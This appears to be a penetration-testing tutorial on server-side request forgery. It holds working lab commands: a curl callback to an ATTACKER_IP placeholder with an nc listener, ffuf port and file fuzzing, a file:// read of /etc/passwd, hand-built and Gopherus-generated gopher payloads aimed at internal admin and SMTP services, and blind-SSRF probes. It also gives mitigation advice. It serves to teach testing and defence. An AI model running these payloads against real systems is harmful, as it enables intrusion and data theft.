### Content

- [Overview](#overview)
- [Identifying](#identifying)
- [Fuzzing](#fuzzing)
	- [Port Scanning](#port-scanning)
	- [Internal Directory Fuzzing](#internal-directory-fuzzing)
	- [Local File Inclusion](#local-file-inclusion)
- [Gopher Protocol](#gopher-protocol)
	- [Crafting POST Request](#crafting-post-request)
	- [Automation with Gopherus](#automation-with-gopherus)
- [Blind SSRF](#blind-ssrf)
- [Mitigation](#mitigation)

---
### Overview

[Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) vulnerability allows an attacker to manipulate a web application into sending unauthorized requests from the server. It occurs when an application makes HTTP requests to other servers based on user input. Exploitation of SSRF can enable an attacker to access internal systems, bypass firewalls, and retrieve sensitive information.

If the web app relies on a user-supplied URL scheme or protocol, attacker can manipulate the URL scheme, the following URL schemes are commonly used in the exploitation of SSRF vulnerabilities:

- `http://` and `https://` URL schemes to fetch content via HTTP/S requests. Which may bypass WAFs, access restricted endpoints, or access endpoints in the internal network
- `file://` URL scheme to read a file from the local file system (LFI).
- `gopher://` protocol to send arbitrary bytes to the specified address. Might be used in the exploitation of SSRF to send HTTP POST requests with arbitrary payloads or communicate with other services, such as SMTP servers or databases

---
### Identifying

If the website is sending such a request to an internal server: 

```http
POST /index.php HTTP/1.1
[SNIP]

dateserver=http://internalServer.local/availability.php&date=2024-01-01
```

We can check if this is a working SSRF vulnerability by supplying a link to our server for the website to fetch to see if there are any kind of sanitization or validation on the user input:

```bash
$ curl -s -X POST "http://10.129.201.127/index.php" --data "dateserver=http://<ATTACKER_IP>:80/index.php&date=2024-01-01" 

$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.16.238] from (UNKNOWN) [10.129.201.127] 51116
GET /index.php HTTP/1.1
Host: 10.10.16.238
Accept: */*
```

---
### Fuzzing
##### Port Scanning

Change the FQDN of the called server to the loop back address and prepare the request for ffuf:

```http
POST /index.php HTTP/1.1
[SNIP]

dateserver=http://127.0.0.1:FUZZ&date=2024-01-01
```

Preparing ports list and using ffuf:

```bash
$ seq 1 10000 > list
$ ffuf -request req -w ./list:FUZZ -request-proto http -fw 16
80                      [Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 74ms]
3306                    [Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 83ms]
8000                    [Status: 200, Size: 37, Words: 215, Lines: 1, Duration: 768ms]
```

##### Internal Directory Fuzzing

```bash
$ cat req
POST /index.php HTTP/1.1
[SNIP]

dateserver=http://internalServer.local/FUZZ.php&date=2024-01-01

$ ffuf -request req -w raft-small-words.txt -request-proto http -fr 'The requested URL was not found on this server.'
```

##### Local File Inclusion

We can try using `file://` URL scheme to read a file from the local file system (LFI).

```bash
$ cat req
POST /index.php HTTP/1.1
[SNIP]

dateserver=file://FUZZ&date=2024-01-01

$ ffuf -request req -w LFI-Jhaddix.txt:FUZZ -request-proto http -fs 0,11
[SNIP]
/etc/hosts.deny         [Status: 200, Size: 711, Words: 128, Lines: 18, Duration: 71ms]
/etc/http/conf/httpd.conf [Status: 200, Size: 56, Words: 6, Lines: 1, Duration: 71ms]
/etc/hosts.allow        [Status: 200, Size: 411, Words: 82, Lines: 11, Duration: 134ms]

# Confirming the LFI
$ curl -s -X POST "http://10.129.201.127/index.php" --data "dateserver=file:///etc/passwd&date=2024-01-01" | head -n 1
root:x:0:0:root:/root:/bin/bash
```

---
### Gopher Protocol

If we are restricted to a specific URL schema or request method such as `GET` only. We can use the [gopher](https://datatracker.ietf.org/doc/html/rfc1436) URL scheme to send arbitrary bytes to a TCP socket. This protocol enables us to create a request by building the HTTP request ourselves to various URL schemas and any request method such POST.

###### Crafting POST Request

Assume we found an internal admin panel which has a login form that contains admin's password field: `adminpw`

```http
POST /index.php HTTP/1.1
[SNIP]

dateserver=http://internalServer.local/admin.php&date=2024-01-01
```

We need to send the following request in the `dataserver` parameter:

```http
POST /admin.php HTTP/1.1
Host: internalServer.local
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

Constructing a valid gopher URL by URL-encoding all special characters such spaces (`%20`) and newlines (`%0D%0A`) then adding the `gopher` URL schema

```TXT
gopher://internalServer.local:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20internalServer.local%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

URL-encode the entire URL again to ensure the correct format of the URL after the web server accepts it:

```http
POST /index.php HTTP/1.1
[SNIP]

dateserver=gopher%3a//internalServer.local%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

###### Automation with Gopherus

If we identified that TCP port 25 (internal SMTP server) is open on the local system. Gopher can be used to interact with this internal SMTP server. [Gopherus](https://github.com/tarunkant/Gopherus) tool can be used to generate gopher URLs for us, the tool supporting the following services:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- SMTP
- Zabbix
- pymemcache
- rbmemcache
- phpmemcache
- dmpmemcache

The tool asks us to input details about the email we intend to send. Afterward, we are given a valid gopher URL that we can use in our SSRF exploitation:

```bash
$ python2.7 gopherus.py --exploit smtp

Give Details to send mail: 

Mail from :  attacker@corp.local
Mail To :  victim@corp.local
Subject :  HelloWorld
Message :  Hello from SSRF!

Your gopher link is ready to send Mail: 

gopher://127.0.0.1:25/_MAIL%20FROM:attacker%corp.local%0ARCPT%20To:victim%40corp.local%0ADATA%0AFrom:attacker%40corp.local%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.

-----------Made-by-SpyD3r-----------
```

---
### Blind SSRF

We can identify a blind SSRF by the method mentioned above : [Identifying](#identifying)

Depending on how the web application catches unexpected errors, observer every request and response to differentiate between the normal and the abnormal behavior.

While we cannot use blind SSRF vulnerabilities to directly exfiltrate data, we can enumerate open ports in the local network or enumerate existing files on the filesystem. This may reveal information about the underlying system architecture that can help prepare subsequent attacks. Keep in mind that even if the web application responds with the same error message for both open and closed ports, we can still interact with the internal network, even if it's blindly. Therefore, we can potentially exploit internal web applications by guessing common payloads.

```bash
$ curl -s -X POST "http://10.129.18.225/index.php" --data "dateserver=http://127.0.0.1:80/&date=2024-01-01"
Date is unavailable. Please choose a different date!  

# Changing the port yeild a new response body
$ curl -s -X POST "http://10.129.18.225/index.php" --data "dateserver=http://127.0.0.1:81/&date=2024-01-01"
Something went wrong! 
```

---
### Mitigation

Mitigations and countermeasures can be implemented at the web application or network layers. 

- The remote server which is the origin of the data fetched should be checked against a whitelist to prevent an attacker from coercing the server to make requests against arbitrary origins.
	- A whitelist prevents an attacker from making unintended requests to internal systems. 
- URL scheme and protocol used in the request need to be restricted to prevent attackers from supplying arbitrary protocols.
	- It should be hardcoded or checked against a whitelist.

On the network layer, appropriate firewall rules can prevent outgoing requests to unexpected remote systems. If properly implemented, a restrictive firewall configuration can mitigate SSRF vulnerabilities in the web application by dropping any outgoing requests to potentially interesting target systems. Additionally, network segmentation can prevent attackers from exploiting SSRF vulnerabilities to access internal systems.

[OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).